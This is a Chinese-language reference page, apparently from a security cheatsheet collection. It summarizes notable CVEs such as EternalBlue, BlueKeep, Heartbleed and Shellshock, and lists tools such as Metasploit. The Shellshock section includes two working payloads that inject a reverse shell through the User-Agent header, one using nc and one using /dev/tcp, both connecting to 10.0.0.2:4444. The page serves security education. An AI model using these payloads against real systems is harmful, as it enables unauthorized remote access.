# 常见漏洞与暴露

> CVE（常见漏洞与暴露）是分配给已知网络安全漏洞的唯一标识符。CVE有助于标准化漏洞的命名和跟踪，使组织、安全专业人员和软件供应商更容易共享信息并管理与这些漏洞相关的风险。每个CVE条目包括漏洞的简要描述、其潜在影响以及受影响的软件或系统的详细信息。

## 概述

* [工具](#工具)
* [过去15年的重要CVE](#过去15年的重要CVE)
    * [CVE-2017-0144 - 永恒之蓝](#cve-2017-0144---永恒之蓝)
    * [CVE-2017-5638 - Apache Struts 2](#cve-2017-5638---apache-struts-2)
    * [CVE-2018-7600 - Drupalgeddon 2](#cve-2018-7600---drupalgeddon-2)
    * [CVE-2019-0708 - BlueKeep](#cve-2019-0708---bluekeep)
    * [CVE-2019-19781 - Citrix ADC Netscaler](#cve-2019-19781---citrix-adc-netscaler)
    * [CVE-2014-0160 - Heartbleed](#cve-2014-0160---heartbleed)
    * [CVE-2014-6271 - Shellshock](#cve-2014-6271---shellshock)
* [参考文献](#参考文献)

## 工具

* [Trickest CVE仓库 - 自动收集的CVE和PoC](https://github.com/trickest/cve)
* [Nuclei模板 - 社区维护的应用程序安全漏洞查找模板列表](https://github.com/projectdiscovery/nuclei-templates)
* [Metasploit框架](https://github.com/rapid7/metasploit-framework)
* [CVE Details - 最终的安全漏洞数据源](https://www.cvedetails.com)

## 过去15年的重要CVE

### CVE-2017-0144 - 永恒之蓝

永恒之蓝利用了微软实现服务器消息块（SMB）协议中的一个漏洞。由于各种版本的Windows中SMB v1（SMBv1）服务器错误处理远程攻击者精心制作的数据包，导致此漏洞存在。这使得攻击者能够在目标计算机上执行任意代码。

受影响的系统：

* Windows Vista SP2
* Windows Server 2008 SP2 和 R2 SP1
* Windows 7 SP1
* Windows 8.1
* Windows Server 2012 Gold 和 R2
* Windows RT 8.1
* Windows 10 Gold、1511 和 1607
* Windows Server 2016

### CVE-2017-5638 - Apache Struts 2

3月6日，Apache Struts 2出现了一个新的远程代码执行（RCE）漏洞。这个最近的漏洞，CVE-2017-5638，允许远程攻击者通过“Content-Type”头注入操作系统命令到Web应用程序中。

### CVE-2018-7600 - Drupalgeddon 2

Drupal 7.x和8.x多个子系统中存在远程代码执行漏洞。这可能允许攻击者在Drupal站点上利用多个攻击向量，可能导致站点被完全攻破。

### CVE-2019-0708 - BlueKeep

当未认证的攻击者使用RDP连接到目标系统并发送特制请求时，在远程桌面服务中存在远程代码执行漏洞——以前称为终端服务。此漏洞是在未经身份验证的情况下发生的，并且不需要用户交互。成功利用此漏洞的攻击者可以在目标系统上执行任意代码。攻击者随后可以安装程序、查看、更改或删除数据，或者创建具有完全用户权限的新帐户。

### CVE-2019-19781 - Citrix ADC Netscaler

Citrix Application Delivery Controller（ADC），以前称为NetScaler ADC，以及Citrix Gateway，以前称为NetScaler Gateway中存在远程代码执行漏洞。如果被利用，这可能允许未认证的攻击者执行任意代码。

受影响的产品：

* Citrix ADC 和 Citrix Gateway 版本13.0的所有受支持版本
* Citrix ADC 和 NetScaler Gateway 版本12.1的所有受支持版本
* Citrix ADC 和 NetScaler Gateway 版本12.0的所有受支持版本
* Citrix ADC 和 NetScaler Gateway 版本11.1的所有受支持版本
* Citrix NetScaler ADC 和 NetScaler Gateway 版本10.5的所有受支持版本

### CVE-2014-0160 - Heartbleed

Heartbleed Bug 是OpenSSL加密软件库的一个严重漏洞。这个弱点允许窃取在正常情况下由SSL/TLS加密保护的信息，SSL/TLS用于为互联网上的通信提供安全性和隐私。SSL/TLS为诸如Web、电子邮件、即时消息（IM）以及一些虚拟私人网络（VPNs）等应用提供了互联网上的通信安全和隐私。

### CVE-2014-6271 - Shellshock

Shellshock，也被称为Bashdoor，是一系列在广泛使用的Unix Bash shell中存在的安全漏洞，其中第一个于2014年9月24日披露。许多面向互联网的服务，如某些Web服务器部署，使用Bash来处理某些请求，这允许攻击者导致易受攻击版本的Bash执行任意命令。这可以使攻击者未经授权访问计算机系统。

```powershell
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\r\n"
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" 
```

## 参考文献

* [Heartbleed - 官方网站](http://heartbleed.com)
* [Shellshock - 维基百科](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
* [Imperva对Apache Struts的分析](https://www.imperva.com/blog/2017/03/cve-2017-5638-new-remote-code-execution-rce-vulnerability-in-apache-struts-2/)
* [EternalBlue - 维基百科](https://en.wikipedia.org/wiki/EternalBlue)
* [BlueKeep - 微软](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708)